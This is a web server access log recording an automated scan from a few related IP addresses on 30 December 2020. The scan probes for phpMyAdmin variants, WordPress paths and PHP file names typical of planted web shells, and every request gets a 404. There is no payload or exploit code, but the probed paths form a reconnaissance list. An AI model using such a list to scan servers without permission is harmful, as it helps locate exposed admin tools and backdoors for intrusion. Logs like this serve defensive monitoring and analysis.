36.133.37.5 - - [30/Dec/2020:13:38:36 +0000] "GET /phpMyAdmins/index.php HTTP/1.1" 404 435 "http://SERVER_ADDR/phpMyAdmins/index.php" "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.2; WOW64; Trident/5.0)"
36.133.37.5 - - [30/Dec/2020:13:38:58 +0000] "GET /mysql-admin/index.php HTTP/1.1" 404 435 "http://SERVER_ADDR/mysql-admin/index.php" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.6; rv:5.0) Gecko/20100101 Firefox/5.0"
36.133.37.3 - - [30/Dec/2020:13:39:20 +0000] "GET /c.php HTTP/1.1" 404 435 "http://SERVER_ADDR/c.php" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:10.0.1) Gecko/20100101 Firefox/10.0.1"
36.133.37.3 - - [30/Dec/2020:13:39:27 +0000] "GET /wp-includes/fonts/wp-login.php HTTP/1.1" 404 435 "http://SERVER_ADDR/wp-includes/fonts/wp-login.php" "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Avant Browser; Avant Browser; .NET CLR 1.0.3705; .NET CLR 1.1.4322; Media Center PC 4.0; .NET CLR 2.0.50727; .NET CLR 3.0.04506.30)"
36.133.37.5 - - [30/Dec/2020:13:39:30 +0000] "GET /plus/mytag.php HTTP/1.1" 404 435 "http://SERVER_ADDR/plus/mytag.php" "Opera/9.80 (Windows NT 5.1; U; zh-tw) Presto/2.8.131 Version/11.10"
36.133.37.3 - - [30/Dec/2020:13:39:38 +0000] "GET /admin/mysql/index.php HTTP/1.1" 404 435 "http://SERVER_ADDR/admin/mysql/index.php" "Opera/9.80 (Macintosh; Intel Mac OS X 10.4.11; U; en) Presto/2.7.62 Version/11.00"
36.133.37.6 - - [30/Dec/2020:13:39:40 +0000] "GET /phpmyadmin2222/index.php HTTP/1.1" 404 435 "http://SERVER_ADDR/phpmyadmin2222/index.php" "Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_7; en-us) AppleWebKit/534.20.8 (KHTML, like Gecko) Version/5.1 Safari/534.20.8"
36.133.37.5 - - [30/Dec/2020:13:39:44 +0000] "GET /phppma/index.php HTTP/1.1" 404 435 "http://SERVER_ADDR/phppma/index.php" "Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_5_6; en-US) AppleWebKit/528.16 (KHTML, like Gecko, Safari/528.16) OmniWeb/v622.8.0"
36.133.37.6 - - [30/Dec/2020:13:39:52 +0000] "GET /data/admin/help.php HTTP/1.1" 404 435 "http://SERVER_ADDR/data/admin/help.php" "Opera/9.80 (Windows NT 6.1; U; es-ES) Presto/2.9.181 Version/12.00"
36.133.37.3 - - [30/Dec/2020:13:39:59 +0000] "GET /wp-content/plugins/portable-phpmyadmin/wp-pma-mod/index.php HTTP/1.1" 404 435 "http://SERVER_ADDR/wp-content/plugins/portable-phpmyadmin/wp-pma-mod/index.php" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:15.0) Gecko/20120427 Firefox/15.0a1"
36.133.37.6 - - [30/Dec/2020:13:40:19 +0000] "GET /phpMyAdminhf/index.php HTTP/1.1" 404 435 "http://SERVER_ADDR/phpMyAdminhf/index.php" "Mozilla/5.0 (compatible; MSIE 10.6; Windows NT 6.1; Trident/5.0; InfoPath.2; SLCC1; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; .NET CLR 2.0.50727) 3gpp-gba UNTRUSTED/1.0"
36.133.37.6 - - [30/Dec/2020:13:40:33 +0000] "GET /123131/index.php HTTP/1.1" 404 435 "http://SERVER_ADDR/123131/index.php" "Mozilla/5.0 (Windows NT 5.1; rv:5.0) Gecko/20100101 Firefox/5.0"
36.133.37.6 - - [30/Dec/2020:13:40:47 +0000] "GET /wp-includes/css/modules.php HTTP/1.1" 404 435 "http://SERVER_ADDR/wp-includes/css/modules.php" "Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_6; en-us) AppleWebKit/533.20.25 (KHTML, like Gecko) Version/5.0.4 Safari/533.20.27"
36.133.37.3 - - [30/Dec/2020:13:40:53 +0000] "GET /phpMyAdmin123/index.php HTTP/1.1" 404 435 "http://SERVER_ADDR/phpMyAdmin123/index.php" "Opera/9.80 (Macintosh; Intel Mac OS X; U; en) Presto/2.6.30 Version/10.61"
36.133.37.6 - - [30/Dec/2020:13:41:00 +0000] "GET /tools/phpMyAdmin/index.php HTTP/1.1" 404 435 "http://SERVER_ADDR/tools/phpMyAdmin/index.php" "Mozilla/4.0 (compatible; MSIE 5.5; Windows 98; Win 9x 4.90)"
36.133.37.3 - - [30/Dec/2020:13:41:13 +0000] "GET /guipu.php HTTP/1.1" 404 435 "http://SERVER_ADDR/guipu.php" "Opera/9.80 (Windows NT 5.2; U; en) Presto/2.2.15 Version/10.10"
36.133.37.3 - - [30/Dec/2020:13:41:25 +0000] "GET /plus/huai.php HTTP/1.1" 404 435 "http://SERVER_ADDR/plus/huai.php" "Opera/9.80 (Windows NT 5.1; U; zh-tw) Presto/2.8.131 Version/11.10"
36.133.37.6 - - [30/Dec/2020:13:42:18 +0000] "GET /phpMyadmin_bak/index.php HTTP/1.1" 404 435 "http://SERVER_ADDR/phpMyadmin_bak/index.php" "Opera/9.20 (Macintosh; Intel Mac OS X; U; en)"
36.133.37.6 - - [30/Dec/2020:13:42:21 +0000] "GET /phpmyadmin2/index.php HTTP/1.1" 404 435 "http://SERVER_ADDR/phpmyadmin2/index.php" "Mozilla/4.0 (compatible; GoogleToolbar 4.0.1019.5266-big; Windows XP 5.1; MSIE 6.0.2900.2180)"
